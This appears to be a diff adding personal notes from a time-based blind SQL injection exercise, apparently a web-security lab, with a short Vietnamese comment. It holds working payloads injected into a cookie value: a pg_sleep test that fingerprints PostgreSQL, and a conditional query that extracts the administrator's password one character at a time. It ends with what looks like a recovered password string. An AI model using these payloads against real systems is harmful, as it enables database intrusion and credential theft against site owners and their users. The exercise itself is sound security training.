@@ -1,0 +1,7 @@
+cookie' pg_sleep(10)-- 
+=> slow 10s => PostgreSQL
+
+luc mat khau 
+cookie'|| (SELECT CASE WHEN substring(password,1,1) = '§a§' then pg_sleep(10) else '' END from users where username = 'administrator')--
+
+7wwejlxamgkaserzkaqp
